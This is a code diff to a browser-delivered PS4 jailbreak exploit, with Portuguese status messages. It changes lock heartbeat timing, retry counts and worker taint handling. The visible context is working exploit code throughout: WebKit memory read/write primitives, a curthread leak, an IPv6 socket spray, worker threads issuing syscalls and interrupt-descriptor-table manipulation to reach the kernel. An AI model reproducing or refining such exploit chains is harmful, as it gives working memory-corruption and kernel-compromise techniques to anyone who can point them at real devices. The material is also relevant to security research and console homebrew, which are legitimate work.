@@ -15,13 +15,7 @@ const EXECUTION_OWNER_KEY = "__RAW13G_JB_EXECUTION_OWNER__";
 const EXECUTION_HEARTBEAT_MS = 15000;
 
 function createExecutionOwner() {
-  return (
-    Date.now().toString(36) +
-    "-" +
-    Math.random().toString(36).slice(2) +
-    "-" +
-    Math.random().toString(36).slice(2)
-  );
+  return String(Date.now()) + "-" + String(Math.floor(Math.random() * 1000000));
 }
 
 function acquireExecutionLock() {
@@ -326,10 +320,7 @@ const WORKER_STATE = {
     finishUI(false);
     return;
   }
-  const executionHeartbeat = setInterval(
-    () => updateExecutionLock("running"),
-    EXECUTION_HEARTBEAT_MS,
-  );
+  let executionHeartbeat = null;
   try {
     sessionStorage.setItem("jb_session_state", "in_progress");
   } catch (e) {}
@@ -338,9 +329,7 @@ const WORKER_STATE = {
   let closeFd = null;
   let w1 = null,
     w2 = null;
-  const resourceLedger = new ResourceLedger((fd) =>
-    closeFd ? closeFd(fd) : -1,
-  );
+  let resourceLedger = null;
   try {
     const { key, off } = offsetsFor(navigator.userAgent);
     mark("FW", key || "(not a PS4 UA)");
@@ -504,10 +493,10 @@ const WORKER_STATE = {
 
     const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
     const carrier = await establishPrimitive({
-      maxAttempts: 6,
+      maxAttempts: 2,
       onEvent: (t, d, a) => {
         if (a != null) {
-          updateSub("Tentativa " + a + "/6: Ajustando memória e ArrayBuffers (" + t + ")...");
+          updateSub("Tentativa " + a + "/2: Ajustando memória e ArrayBuffers (" + t + ")...");
         }
         (PRIMITIVE_LOUD.test(t) ? mark : trace)(
           t,
@@ -528,6 +517,11 @@ const WORKER_STATE = {
     );
     mark("PRIMITIVE-OK", "");
     setStageUI(1, "ETAPA 1/4: WebKit Primitives Prontas", "Primitivas de leitura/escrita ARW estabelecidas com sucesso.", "ok");
+
+    executionHeartbeat = setInterval(
+      () => updateExecutionLock("running"),
+      EXECUTION_HEARTBEAT_MS,
+    );
 
     const cell = p.leakval(Math.expm1);
     const nativeFn = p.read8(
@@ -837,6 +831,9 @@ const WORKER_STATE = {
       : 40000000;
     mark("PR-CFG", "nleak=" + N_LEAK + " spray=" + SPRAY + " spin=" + SPIN);
     setStageUI(2, "ETAPA 2/4: Thread & Sockets", "Inicializando workers, vazando curthread e disparando spray de sockets IPv6...");
+    if (!resourceLedger) {
+      resourceLedger = new ResourceLedger((fd) => (closeFd ? closeFd(fd) : -1));
+    }
 
     async function bringWorker(name) {
       const w = {
@@ -923,9 +920,7 @@ const WORKER_STATE = {
     w1 = await bringWorker("w1");
     w2 = await bringWorker("w2");
     w1.state = WORKER_STATE.KERNEL_ACTIVE;
-    w1.tainted = true;
     w2.state = WORKER_STATE.KERNEL_ACTIVE;
-    w2.tainted = true;
     await w1.fire(SYS.getpid, []);
     const w1pid = w1.ctx.frameDv.getUint32(0, true) | 0;
     await w2.fire(SYS.getpid, []);
@@ -1809,6 +1804,14 @@ const WORKER_STATE = {
     // kernel, so from here a failure must NOT auto-reload. Reset the counter
     // so the next manual run starts fresh.
     clearRetry();
+    if (w1) {
+      w1.tainted = true;
+      w1.state = WORKER_STATE.TAINTED;
+    }
+    if (w2) {
+      w2.tainted = true;
+      w2.state = WORKER_STATE.TAINTED;
+    }
 
     const IDT = new int64(0x00001a00, 0xffffff80);
     const GATE_SZ = 16;
@@ -3644,14 +3647,14 @@ const WORKER_STATE = {
     state("threw", "bad");
     setStageUI(currentStage || 1, "FALHA NA EXECUÇÃO DO EXPLOIT", (e && e.message) || String(e), "bad");
   } finally {
-    clearInterval(executionHeartbeat);
+    if (executionHeartbeat) clearInterval(executionHeartbeat);
     try {
       if (jbRestoreHook) jbRestoreHook("finally", false);
     } catch (error_) {
       mark("JB-RESTORE-THREW", (error_ && error_.message) || String(error_));
     }
     try {
-      if (resourceLedger.size && closeFd && mainArmed) {
+      if (resourceLedger && resourceLedger.size && closeFd && mainArmed) {
         const pending = resourceLedger.pendingCount;
         const n = resourceLedger.teardownAll();
         mark("STRAGGLERS-CLOSED", n + "/" + pending);
